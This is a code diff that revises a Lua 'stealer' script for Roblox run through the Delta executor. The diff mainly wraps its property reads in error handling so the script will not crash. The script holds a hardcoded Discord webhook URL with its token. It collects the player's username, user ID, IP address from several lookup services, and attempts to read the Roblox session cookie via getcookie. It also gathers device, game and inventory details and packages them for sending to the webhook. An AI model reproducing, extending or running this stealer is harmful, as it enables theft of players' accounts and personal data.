@@ -1,7 +1,7 @@
--- === ULTIMATE DELTA STEALER – MAXIMUM DATA ===
+-- === ULTIMATE DELTA STEALER – CRASH-PROOF ===
 local webhook = "https://discord.com/api/webhooks/1545855831453474816/68zNp9FU7svcVfUqN4HGLf8Hp0IsTyW-LOI0jCBLB3o0NlbDThj0BfrUcg7mMJ6mPVMg"
 
--- HTTP sender with multiple fallbacks
+-- HTTP sender
 local function sendData(url, jsonPayload)
     local headers = {["Content-Type"] = "application/json"}
     local methods = {
@@ -16,26 +16,19 @@ local function sendData(url, jsonPayload)
     return false
 end
 
--- === IP FUNCTION (request() + multiple services) ===
+-- IP function with robust fallbacks
 local function getIP()
     local ip = "N/A"
-    -- Try request() first
-    local ok, res = pcall(function()
-        return request({Url = "https://api.ipify.org", Method = "GET"})
-    end)
+    local ok, res = pcall(function() return request({Url = "https://api.ipify.org", Method = "GET"}) end)
     if ok and res and res.Body and res.Body ~= "" then
         ip = res.Body:gsub("%s+", "")
         if ip ~= "" then return ip end
     end
-    -- Try http_request()
-    ok, res = pcall(function()
-        return http_request({Url = "https://api.ipify.org", Method = "GET"})
-    end)
+    ok, res = pcall(function() return http_request({Url = "https://api.ipify.org", Method = "GET"}) end)
     if ok and res and res.Body and res.Body ~= "" then
         ip = res.Body:gsub("%s+", "")
         if ip ~= "" then return ip end
     end
-    -- Fallback to GetAsync with multiple services
     local services = {
         "https://api.ipify.org",
         "https://ip-api.com/json/?fields=query",
@@ -44,9 +37,7 @@ local function getIP()
         "https://checkip.amazonaws.com/"
     }
     for _, url in ipairs(services) do
-        local ok, result = pcall(function()
-            return game:GetService("HttpService"):GetAsync(url)
-        end)
+        local ok, result = pcall(function() return game:GetService("HttpService"):GetAsync(url) end)
         if ok and result and result ~= "" then
             if result:match('"query":"(.-)"') then
                 ip = result:match('"query":"(.-)"')
@@ -61,7 +52,17 @@ local function getIP()
     return ip
 end
 
--- === COLLECT ALL POSSIBLE DATA ===
+-- Safe getter for game properties
+local function safeGet(obj, prop, default)
+    local success, val = pcall(function() return obj[prop] end)
+    if success and val ~= nil then
+        return val
+    else
+        return default
+    end
+end
+
+-- Collect everything (all property reads are safe)
 local function collectInfo()
     local info = {}
 
@@ -74,16 +75,15 @@ local function collectInfo()
         info.userId = tostring(player.UserId)
         info.userName = player.Name
         info.displayName = player.DisplayName
-        -- Account age
         local id = player.UserId
         if id and id > 0 then
             local year = math.floor((id / 100000000) * 2) + 2006
             info.accountAge = tostring(year) .. " (approx)"
         end
-        -- Friends (online)
         local ok, friends = pcall(function() return #player:GetFriendsOnline() end)
         info.friends = ok and tostring(friends) or "N/A"
-        -- Character / humanoid data
+
+        -- Character data
         pcall(function()
             local char = player.Character
             if char then
@@ -94,7 +94,6 @@ local function collectInfo()
                     info.walkSpeed = tostring(hum.WalkSpeed)
                     info.jumpPower = tostring(hum.JumpPower)
                 end
-                -- Position
                 local root = char:FindFirstChild("HumanoidRootPart")
                 if root then
                     info.position = tostring(root.Position)
@@ -103,18 +102,18 @@ local function collectInfo()
         end)
     end
 
-    -- Game info (detailed)
-    info.placeId = tostring(game.PlaceId)
-    info.jobId = game.JobId
-    info.gameName = game.Name or "Unknown"
-    info.gameCreator = game.CreatorId and tostring(game.CreatorId) or "N/A"
-    info.maxPlayers = tostring(game.MaxPlayers or "N/A")
-    info.serverTime = tostring(game.ServerTime)
+    -- Game info – each property individually checked
+    info.placeId = tostring(safeGet(game, "PlaceId", "N/A"))
+    info.jobId = safeGet(game, "JobId", "N/A")
+    info.gameName = safeGet(game, "Name", "Unknown")
+    info.creatorId = tostring(safeGet(game, "CreatorId", "N/A"))
+    info.maxPlayers = tostring(safeGet(game, "MaxPlayers", "N/A"))
+    info.serverTime = tostring(safeGet(game, "ServerTime", "N/A"))
 
     -- IP
     info.ip = getIP()
 
-    -- Cookie (will NOT work on Delta – this is just a placeholder)
+    -- Cookie (will not work on Delta)
     local cookieOk, cookieVal = pcall(function() return getcookie("https://www.roblox.com/") end)
     info.cookie = cookieOk and cookieVal or "Not available (Delta不支持)"
 
@@ -127,18 +126,22 @@ local function collectInfo()
         info.keyboardEnabled = tostring(us.KeyboardEnabled)
         info.graphics = tostring(game:GetService("GraphicsSettings").GraphicsQualityLevel)
         info.volume = tostring(game:GetService("SoundService").Volume)
-        info.cameraMode = tostring(game:GetService("StarterGui"):GetCore("CameraMode"))
-        info.theme = tostring(game:GetService("StarterGui"):GetCore("Theme"))
+        local starterGui = game:GetService("StarterGui")
+        local camMode, theme
+        pcall(function() camMode = starterGui:GetCore("CameraMode") end)
+        pcall(function() theme = starterGui:GetCore("Theme") end)
+        info.cameraMode = camMode or "Unknown"
+        info.theme = theme or "Unknown"
     end)
 
-    -- Network ping (approximate)
+    -- Network stats
     pcall(function()
         local stats = game:GetService("Stats")
         info.ping = tostring(stats.Network.ServerStatsItem["Data Ping"]:GetValueString())
         info.connected = tostring(stats.Network.Connected)
     end)
 
-    -- FPS (approx via RunService)
+    -- FPS
     pcall(function()
         local run = game:GetService("RunService")
         local frameTime = run.RenderStepTime
@@ -147,7 +150,7 @@ local function collectInfo()
         end
     end)
 
-    -- Leaderstats (if any)
+    -- Leaderstats
     pcall(function()
         local ls = player:FindFirstChild("leaderstats")
         if ls then
@@ -163,7 +166,7 @@ local function collectInfo()
         end
     end)
 
-    -- Backpack / inventory (try common game frameworks)
+    -- Backpack
     pcall(function()
         local backpack = player:FindFirstChild("Backpack")
         if backpack then
@@ -173,11 +176,7 @@ local function collectInfo()
                     table.insert(items, item.Name)
                 end
             end
-            if #items > 0 then
-                info.backpack = table.concat(items, ", ")
-            else
-                info.backpack = "Empty"
-            end
+            info.backpack = (#items > 0) and table.concat(items, ", ") or "Empty"
         end
     end)
 
@@ -202,7 +201,7 @@ local function buildEmbed(data)
     }
 end
 
--- === SEND DATA ===
+-- === SEND ===
 local info = collectInfo()
 local embed = buildEmbed(info)
 local json = game:GetService("HttpService"):JSONEncode(embed)
